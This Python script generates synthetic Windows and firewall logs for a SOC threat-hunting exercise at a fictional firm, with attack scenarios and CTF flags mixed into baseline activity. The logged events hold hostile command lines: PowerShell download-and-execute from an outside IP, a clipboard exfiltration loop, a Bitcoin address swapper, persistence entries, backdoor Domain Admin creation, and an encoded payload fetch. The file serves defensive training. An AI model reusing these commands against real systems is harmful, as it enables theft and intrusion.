#!/usr/bin/env python3
"""
Nexus Financial Corp — Full SOC Simulation
6 attack scenarios hidden in realistic baseline noise.
Single index: windows / network
"""

import json
from datetime import datetime, timedelta

# ─────────────────────────────────────────────
# Company: Nexus Financial Corp
# Domain:  NEXUSFINANCIAL  |  nexusfinancial.com
# Subnet:  10.10.0.0/16
#
# Hosts:
#   NFC-WS-041   Workstation — Emily Carter      (Finance)
#   NFC-WS-017   Workstation — James Thornton    (HR)
#   NFC-WS-029   Workstation — Rachel Okonkwo    (IT Support)
#   NFC-WS-058   Workstation — Daniel Marsh      (Procurement)
#   NFC-WS-063   Workstation — Priya Nair        (Legal)
#   NFC-SRV-DC1  Domain Controller
#   NFC-SRV-FS1  File Server
#   NFC-SRV-EX1  Exchange Mail Server
#   NFC-SRV-WEB1 Internal Web Server
#
# Attacks mapped to ImmersiveLabs labs:
#   [1] Lab1: Clipboard Data Theft    — e.carter    NFC-WS-041  09:12
#   [2] Lab2: Malicious Acct Creation — j.thornton  NFC-SRV-DC1 10:48
#   [3] Lab3: FIN7 Threat Hunting     — r.okonkwo   NFC-WS-029  13:22 + DNS exfil 16:10
#   [4] Lab4: Packet Analysis         — (network)   NFC-SENSOR  17:00
#   [5] Lab5: Malicious OneNote       — d.marsh     NFC-WS-058  14:05
#   [6] Lab6: Suspicious Email IR     — p.nair      NFC-WS-063  15:30
# ─────────────────────────────────────────────

DAY = datetime(2024, 11, 19)

def ts(hour, minute, second=0):
    t = DAY + timedelta(hours=hour, minutes=minute, seconds=second)
    return t.strftime("%Y-%m-%dT%H:%M:%S.000+0000")

win_events = []   # index=windows
net_events = []   # index=network

def win(time, host, sourcetype, data):
    win_events.append({"_host": host, "_sourcetype": sourcetype, "TimeCreated": time, **data})

def net(time, host, data):
    net_events.append({"_host": host, "TimeCreated": time, **data})

# ══════════════════════════════════════════════════
# BASELINE — Morning logons 08:00
# ══════════════════════════════════════════════════

win(ts(8,2),  "NFC-WS-041","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"e.carter","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"IpAddress":"127.0.0.1","WorkstationName":"NFC-WS-041","Message":"An account was successfully logged on."})
win(ts(8,5),  "NFC-WS-017","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"j.thornton","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"IpAddress":"127.0.0.1","WorkstationName":"NFC-WS-017","Message":"An account was successfully logged on."})
win(ts(8,11), "NFC-WS-029","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"r.okonkwo","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"IpAddress":"127.0.0.1","WorkstationName":"NFC-WS-029","Message":"An account was successfully logged on."})
win(ts(8,15), "NFC-WS-058","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"d.marsh","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"IpAddress":"127.0.0.1","WorkstationName":"NFC-WS-058","Message":"An account was successfully logged on."})
win(ts(8,19), "NFC-WS-063","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"p.nair","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"IpAddress":"127.0.0.1","WorkstationName":"NFC-WS-063","Message":"An account was successfully logged on."})
win(ts(8,20), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"svc_backup","TargetDomainName":"NEXUSFINANCIAL","LogonType":5,"IpAddress":"10.10.0.5","WorkstationName":"NFC-SRV-DC1","Message":"An account was successfully logged on."})
win(ts(8,25), "NFC-WS-041","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"e.carter","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","CommandLine":"OUTLOOK.EXE","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
win(ts(8,26), "NFC-WS-017","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"j.thornton","NewProcessName":"C:\\Program Files\\Mozilla Firefox\\firefox.exe","CommandLine":"firefox.exe","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
win(ts(8,30), "NFC-WS-058","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"d.marsh","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","CommandLine":"OUTLOOK.EXE","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
win(ts(8,31), "NFC-WS-063","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"p.nair","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","CommandLine":"OUTLOOK.EXE","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
win(ts(8,35), "NFC-SRV-FS1","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"e.carter","TargetDomainName":"NEXUSFINANCIAL","LogonType":3,"IpAddress":"10.10.1.41","WorkstationName":"NFC-WS-041","Message":"An account was successfully logged on."})
win(ts(8,40), "NFC-WS-029","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"r.okonkwo","NewProcessName":"C:\\Windows\\System32\\mmc.exe","CommandLine":"mmc.exe C:\\Windows\\System32\\compmgmt.msc","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
win(ts(8,50), "NFC-WS-041","WinEventLog:Security",{"EventCode":4625,"TargetUserName":"e.carter","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"IpAddress":"127.0.0.1","FailureReason":"%%2313","Message":"An account failed to log on."})
win(ts(8,50), "NFC-WS-041","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"e.carter","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"IpAddress":"127.0.0.1","WorkstationName":"NFC-WS-041","Message":"An account was successfully logged on."})
net(ts(8,30), "NFC-FW-01", {"src_ip":"10.10.1.41","dst_ip":"52.96.184.100","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":4820,"bytes_in":12400,"app":"office365","user":"e.carter","Message":"Firewall allow."})
net(ts(8,35), "NFC-FW-01", {"src_ip":"10.10.1.17","dst_ip":"8.8.8.8","dst_port":53,"protocol":"udp","action":"allow","bytes_out":68,"bytes_in":84,"app":"dns","user":"j.thornton","Message":"DNS query allowed."})


# ══════════════════════════════════════════════════
# [A] CLIPBOARD DATA THEFT — Emily Carter (NFC-WS-041)
# 09:12 — Phishing email attachment (Payroll doc with macro)
# FLAG: NFCSOC{clip_b4nk3r_exf1l_r0ck3t}
# ══════════════════════════════════════════════════

win(ts(9,5),  "NFC-WS-041","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"e.carter","NewProcessName":"C:\\Windows\\System32\\notepad.exe","CommandLine":"notepad.exe C:\\Users\\e.carter\\Documents\\q4_forecast.txt","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})

# Phishing doc opened from Outlook cache
win(ts(9,12), "NFC-WS-041","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"e.carter","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"WINWORD.EXE /n \"C:\\Users\\e.carter\\AppData\\Local\\Microsoft\\Windows\\INetCache\\Content.Outlook\\T3KF9A2B\\Payroll_Update_Nov2024.docm\"","ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","Message":"A new process has been created."})

win(ts(9,12,30), "NFC-WS-041","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"e.carter","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell.exe -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://45.33.32.156/update/get')\"","ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","Message":"A new process has been created."})

win(ts(9,12,35), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":11,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetFilename":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","ProcessId":5544,"Message":"File created."})

win(ts(9,12,40), "NFC-WS-041","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"e.carter","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","CommandLine":"RuntimeBroker.exe -service","ParentProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Message":"A new process has been created."})

win(ts(9,12,42), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":13,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","TargetObject":"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\RuntimeBrokerSvc","Details":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe -service","Message":"Registry value set."})

win(ts(9,12,45), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":1,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -nop -c \"Add-Type -AssemblyName PresentationCore;while($true){$d=[Windows.Clipboard]::GetText();if($d -ne ''){$b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));Invoke-RestMethod -Uri 'http://45.33.32.156/c' -Method Post -Body $b};Start-Sleep 3}\"","ParentImage":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","ProcessId":5712,"Hashes":"MD5=7E2D541E7E4EC1F1F02084B8ADCE2C73","Message":"Process created."})

win(ts(9,24), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","SourceIp":"10.10.1.41","SourcePort":52341,"DestinationIp":"45.33.32.156","DestinationPort":443,"Protocol":"tcp","ProcessId":5601,"Message":"Network connection detected."})

win(ts(9,35), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":1,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -nop -c \"Add-Type -AssemblyName PresentationCore;$t=[Windows.Clipboard]::GetText();if($t -match '^1[a-km-zA-HJ-NP-Z1-9]{25,34}$'){[Windows.Clipboard]::SetText('1NexusAttackerWalletBTC9xQzR3kLmT')}\"","ParentImage":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","ProcessId":5890,"Hashes":"MD5=A3CF4E9B1D72F3E0C8B5D2A7F4E1C690","Message":"Process created."})

win(ts(9,44), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","SourceIp":"10.10.1.41","SourcePort":52390,"DestinationIp":"45.33.32.156","DestinationPort":443,"Protocol":"tcp","ProcessId":5601,"Message":"Network connection detected."})

# PowerShell ScriptBlock logging (Event ID 4104) — shows decoded commands analysts find in real IR
win(ts(9,12,31), "NFC-WS-041","WinEventLog:Microsoft-Windows-PowerShell/Operational",{"EventID":4104,"EventCode":4104,"SubjectUserName":"e.carter","SubjectDomainName":"NEXUSFINANCIAL","ScriptBlockId":"a1b2c3d4-0001-4001-8001-000000000001","ScriptBlockText":"IEX(New-Object Net.WebClient).DownloadString('http://45.33.32.156/update/get')","Path":"","MessageNumber":1,"MessageTotal":1,"Message":"Creating Scriptblock text (1 of 1): IEX(New-Object Net.WebClient).DownloadString('http://45.33.32.156/update/get')"})

# ScriptBlock for the clipboard monitor loop delivered by IEX
win(ts(9,12,46), "NFC-WS-041","WinEventLog:Microsoft-Windows-PowerShell/Operational",{"EventID":4104,"EventCode":4104,"SubjectUserName":"e.carter","SubjectDomainName":"NEXUSFINANCIAL","ScriptBlockId":"a1b2c3d4-0002-4001-8001-000000000002","ScriptBlockText":"Add-Type -AssemblyName PresentationCore; while($true){ $d=[Windows.Clipboard]::GetText(); if($d -ne ''){ $b=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d)); Invoke-RestMethod -Uri 'http://45.33.32.156/c' -Method Post -Body $b }; Start-Sleep 3 }","Path":"","MessageNumber":1,"MessageTotal":1,"Message":"Creating Scriptblock text (1 of 1): clipboard monitoring loop"})

# ScriptBlock for BTC wallet address swapper
win(ts(9,35,1), "NFC-WS-041","WinEventLog:Microsoft-Windows-PowerShell/Operational",{"EventID":4104,"EventCode":4104,"SubjectUserName":"e.carter","SubjectDomainName":"NEXUSFINANCIAL","ScriptBlockId":"a1b2c3d4-0003-4001-8001-000000000003","ScriptBlockText":"Add-Type -AssemblyName PresentationCore; $t=[Windows.Clipboard]::GetText(); if($t -match '^1[a-km-zA-HJ-NP-Z1-9]{25,34}$'){ [Windows.Clipboard]::SetText('1NexusAttackerWalletBTC9xQzR3kLmT') }","Path":"","MessageNumber":1,"MessageTotal":1,"Message":"Creating Scriptblock text (1 of 1): BTC clipbanker pattern match and replace"})

# Sysmon EventID 7 — PresentationCore.dll loaded (proves clipboard .NET assembly was used)
win(ts(9,12,47), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":7,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ImageLoaded":"C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\WPF\\PresentationCore.dll","Hashes":"MD5=3A2B1C0F4E5D6789AB01CD23EF456789","Signed":"true","Signature":"Microsoft Corporation","ProcessId":5712,"Message":"Image loaded."})

# Sysmon EventID 10 — RuntimeBroker.exe accessing powershell.exe memory (process injection pattern)
win(ts(9,13,10), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":10,"User":"NEXUSFINANCIAL\\e.carter","SourceImage":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","TargetImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","GrantedAccess":"0x1410","CallTrace":"C:\\Windows\\SYSTEM32\\ntdll.dll|C:\\Windows\\System32\\KERNELBASE.dll|UNKNOWN","SourceProcessId":5601,"TargetProcessId":5712,"Message":"Process accessed."})

# Scheduled task created for second persistence (4698)
win(ts(9,13,20), "NFC-WS-041","WinEventLog:Security",{"EventCode":4698,"SubjectUserName":"e.carter","SubjectDomainName":"NEXUSFINANCIAL","TaskName":"\\Microsoft\\Windows\\UpdateOrchestrator\\RuntimeBrokerUpdate","TaskContent":"<?xml version='1.0'?><Task><Triggers><TimeTrigger><Repetition><Interval>PT5M</Interval></Repetition><StartBoundary>2024-11-19T09:13:00</StartBoundary></TimeTrigger></Triggers><Actions><Exec><Command>C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe</Command><Arguments>-service</Arguments></Exec></Actions></Task>","Message":"A scheduled task was created."})

# Repeated beaconing — clipboard content posted to C2 every ~9 min (while loop fired)
win(ts(9,33), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","SourceIp":"10.10.1.41","SourcePort":52355,"DestinationIp":"45.33.32.156","DestinationPort":443,"Protocol":"tcp","ProcessId":5601,"Message":"Network connection detected."})
win(ts(9,42), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","SourceIp":"10.10.1.41","SourcePort":52371,"DestinationIp":"45.33.32.156","DestinationPort":443,"Protocol":"tcp","ProcessId":5601,"Message":"Network connection detected."})
win(ts(9,51), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","SourceIp":"10.10.1.41","SourcePort":52389,"DestinationIp":"45.33.32.156","DestinationPort":443,"Protocol":"tcp","ProcessId":5601,"Message":"Network connection detected."})
win(ts(10,0), "NFC-WS-041","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\e.carter","Image":"C:\\Users\\e.carter\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\RuntimeBroker.exe","SourceIp":"10.10.1.41","SourcePort":52412,"DestinationIp":"45.33.32.156","DestinationPort":443,"Protocol":"tcp","ProcessId":5601,"Message":"Network connection detected."})

net(ts(9,24), "NFC-FW-01",{"src_ip":"10.10.1.41","dst_ip":"45.33.32.156","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":2840,"bytes_in":312,"app":"unknown-ssl","user":"e.carter","Message":"Firewall allow outbound."})
net(ts(9,33), "NFC-FW-01",{"src_ip":"10.10.1.41","dst_ip":"45.33.32.156","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":1960,"bytes_in":186,"app":"unknown-ssl","user":"e.carter","Message":"Firewall allow outbound."})
net(ts(9,42), "NFC-FW-01",{"src_ip":"10.10.1.41","dst_ip":"45.33.32.156","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":3440,"bytes_in":298,"app":"unknown-ssl","user":"e.carter","Message":"Firewall allow outbound."})
net(ts(9,44), "NFC-FW-01",{"src_ip":"10.10.1.41","dst_ip":"45.33.32.156","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":3120,"bytes_in":298,"app":"unknown-ssl","user":"e.carter","Message":"Firewall allow outbound."})
net(ts(9,51), "NFC-FW-01",{"src_ip":"10.10.1.41","dst_ip":"45.33.32.156","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":2280,"bytes_in":234,"app":"unknown-ssl","user":"e.carter","Message":"Firewall allow outbound."})
net(ts(10,0),  "NFC-FW-01",{"src_ip":"10.10.1.41","dst_ip":"45.33.32.156","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":4120,"bytes_in":312,"app":"unknown-ssl","user":"e.carter","Message":"Firewall allow outbound."})


# ══════════════════════════════════════════════════
# BASELINE — 09:30–10:30
# ══════════════════════════════════════════════════

win(ts(9,30), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"svc_patching","TargetDomainName":"NEXUSFINANCIAL","LogonType":5,"IpAddress":"10.10.0.5","WorkstationName":"NFC-SRV-DC1","Message":"An account was successfully logged on."})
win(ts(9,45), "NFC-WS-017","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"j.thornton","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE","CommandLine":"EXCEL.EXE \"C:\\Users\\j.thornton\\Documents\\HR_Headcount_Nov2024.xlsx\"","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
win(ts(10,5), "NFC-SRV-FS1","WinEventLog:Security",{"EventCode":5140,"SubjectUserName":"e.carter","SubjectDomainName":"NEXUSFINANCIAL","IpAddress":"10.10.1.41","ShareName":"\\\\NFC-SRV-FS1\\Finance","Message":"A network share object was accessed."})
net(ts(9,50), "NFC-FW-01",{"src_ip":"10.10.1.17","dst_ip":"172.217.14.100","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":1200,"bytes_in":8400,"app":"google","user":"j.thornton","Message":"Firewall allow."})


# ══════════════════════════════════════════════════
# [B] MALICIOUS ACCOUNT CREATION — James Thornton (NFC-SRV-DC1)
# 10:48 — RDP from external IP using stolen credentials
# FLAG: NFCSOC{n3w_4dm1n_backd00r_dc}
# ══════════════════════════════════════════════════

win(ts(10,48), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4624,"SubjectUserName":"SYSTEM","TargetUserName":"j.thornton","TargetDomainName":"NEXUSFINANCIAL","LogonType":10,"IpAddress":"91.108.4.177","WorkstationName":"NFC-WS-017","Message":"An account was successfully logged on."})

win(ts(10,48,30), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"j.thornton","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe","ParentProcessName":"C:\\Windows\\System32\\rdpclip.exe","Message":"A new process has been created."})

win(ts(10,49), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"j.thornton","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Windows\\System32\\net.exe","CommandLine":"net user helpdesk.support Str0ngP@ss2024! /add /domain","ParentProcessName":"C:\\Windows\\System32\\cmd.exe","Message":"A new process has been created."})

win(ts(10,49,5), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4720,"SubjectUserName":"j.thornton","SubjectDomainName":"NEXUSFINANCIAL","TargetUserName":"helpdesk.support","TargetDomainName":"NEXUSFINANCIAL","Message":"A user account was created."})

win(ts(10,49,6), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4722,"SubjectUserName":"j.thornton","SubjectDomainName":"NEXUSFINANCIAL","TargetUserName":"helpdesk.support","TargetDomainName":"NEXUSFINANCIAL","Message":"A user account was enabled."})

win(ts(10,49,30), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"j.thornton","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Windows\\System32\\net.exe","CommandLine":"net group \"Domain Admins\" helpdesk.support /add /domain","ParentProcessName":"C:\\Windows\\System32\\cmd.exe","Message":"A new process has been created."})

win(ts(10,49,35), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4728,"SubjectUserName":"j.thornton","SubjectDomainName":"NEXUSFINANCIAL","MemberName":"NEXUSFINANCIAL\\helpdesk.support","TargetUserName":"Domain Admins","TargetDomainName":"NEXUSFINANCIAL","Message":"A member was added to a security-enabled global group."})

win(ts(10,51), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":4624,"SubjectUserName":"SYSTEM","TargetUserName":"helpdesk.support","TargetDomainName":"NEXUSFINANCIAL","LogonType":3,"IpAddress":"91.108.4.177","WorkstationName":"ATTACKER-HOST","Message":"An account was successfully logged on."})

win(ts(10,55), "NFC-SRV-DC1","WinEventLog:Security",{"EventCode":1102,"SubjectUserName":"helpdesk.support","SubjectDomainName":"NEXUSFINANCIAL","Message":"The audit log was cleared."})

net(ts(10,48), "NFC-FW-01",{"src_ip":"91.108.4.177","dst_ip":"10.10.0.5","dst_port":3389,"protocol":"tcp","action":"allow","bytes_out":9800,"bytes_in":14200,"app":"rdp","user":"j.thornton","Message":"Inbound RDP allowed."})
net(ts(10,51), "NFC-FW-01",{"src_ip":"91.108.4.177","dst_ip":"10.10.0.5","dst_port":3389,"protocol":"tcp","action":"allow","bytes_out":4200,"bytes_in":6100,"app":"rdp","user":"helpdesk.support","Message":"Inbound RDP allowed."})


# ══════════════════════════════════════════════════
# BASELINE — 11:00–13:00
# ══════════════════════════════════════════════════

win(ts(11,0),  "NFC-WS-063","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"p.nair","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"WINWORD.EXE \"C:\\Users\\p.nair\\Documents\\Contract_Draft_v2.docx\"","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
win(ts(11,30), "NFC-WS-017","WinEventLog:Security",{"EventCode":4634,"TargetUserName":"j.thornton","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"Message":"An account was logged off."})
win(ts(11,45), "NFC-WS-058","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"d.marsh","NewProcessName":"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe","CommandLine":"chrome.exe","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})
win(ts(12,0),  "NFC-SRV-EX1","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"svc_exchange","TargetDomainName":"NEXUSFINANCIAL","LogonType":5,"IpAddress":"10.10.0.12","WorkstationName":"NFC-SRV-EX1","Message":"An account was successfully logged on."})
win(ts(12,15), "NFC-WS-029","WinEventLog:Security",{"EventCode":4624,"TargetUserName":"r.okonkwo","TargetDomainName":"NEXUSFINANCIAL","LogonType":2,"IpAddress":"127.0.0.1","WorkstationName":"NFC-WS-029","Message":"An account was successfully logged on."})
net(ts(12,0),  "NFC-FW-01",{"src_ip":"10.10.1.63","dst_ip":"172.217.14.100","dst_port":443,"protocol":"tcp","action":"allow","bytes_out":2100,"bytes_in":9800,"app":"google","user":"p.nair","Message":"Firewall allow."})


# ══════════════════════════════════════════════════
# [C] FIN7-STYLE RAT — Rachel Okonkwo (NFC-WS-029)
# 13:22 — VPN Setup doc (macro), CARBANAK-like behavior
# FLAG: NFCSOC{f1n7_l4t3r4l_0wned_dc}
# ══════════════════════════════════════════════════

win(ts(13,10), "NFC-WS-029","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"r.okonkwo","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"WINWORD.EXE \"C:\\Users\\r.okonkwo\\Documents\\IT_Policy_Draft_v3.docx\"","ParentProcessName":"C:\\Windows\\explorer.exe","Message":"A new process has been created."})

win(ts(13,22), "NFC-WS-029","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"r.okonkwo","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","CommandLine":"WINWORD.EXE /n \"C:\\Users\\r.okonkwo\\Downloads\\VPN_Client_Setup_Instructions.docm\"","ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE","Message":"A new process has been created."})

win(ts(13,22,20), "NFC-WS-029","WinEventLog:Security",{"EventCode":4688,"SubjectUserName":"r.okonkwo","SubjectDomainName":"NEXUSFINANCIAL","NewProcessName":"C:\\Windows\\System32\\cmd.exe","CommandLine":"cmd.exe /c powershell -nop -w hidden -enc dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA3ADYALgA5ADgALgAxADEAMgAuADMAOQAvAHAAYQB5AGwAbwBhAGQALwBzAHQAYQBnAGUAMQAuAGUAeABlAA==","ParentProcessName":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","Message":"A new process has been created."})

win(ts(13,22,21), "NFC-WS-029","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":1,"User":"NEXUSFINANCIAL\\r.okonkwo","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -nop -w hidden -enc dwBnAGUAdAAgAGgAdAB0AHAAOgAvAC8AMQA3ADYALgA5ADgALgAxADEAMgAuADMAOQAvAHAAYQB5AGwAbwBhAGQALwBzAHQAYQBnAGUAMQAuAGUAeABlAA==","ParentImage":"C:\\Windows\\System32\\cmd.exe","ProcessId":7104,"Hashes":"MD5=DE96A6E69944335375DC1AC238336066","Message":"Process created."})

win(ts(13,22,25), "NFC-WS-029","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":3,"User":"NEXUSFINANCIAL\\r.okonkwo","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SourceIp":"10.10.1.29","SourcePort":49871,"DestinationIp":"176.98.112.39","DestinationPort":8080,"Protocol":"tcp","ProcessId":7104,"Message":"Network connection detected."})

win(ts(13,22,30), "NFC-WS-029","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":11,"User":"NEXUSFINANCIAL\\r.okonkwo","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","TargetFilename":"C:\\ProgramData\\Microsoft\\Windows\\DeviceGuard\\OneDriveSetup.exe","ProcessId":7104,"Message":"File created."})

win(ts(13,22,35), "NFC-WS-029","XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",{"EventID":1,"User":"NEXUSFINANCIAL\\r.okonkwo","Image":"C:\\ProgramData\\Microsoft\\Windows\\DeviceGuard\\OneDriveSetup.exe","CommandLine":"C:\\ProgramData\\Microsoft\\Windows\\DeviceGuard\\OneDriveSetup.exe","ParentImage":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","ProcessId":7280,"Hashes":"MD5=B2E3D4F1A5C6E7891011121314151617","Message":"Process created."})

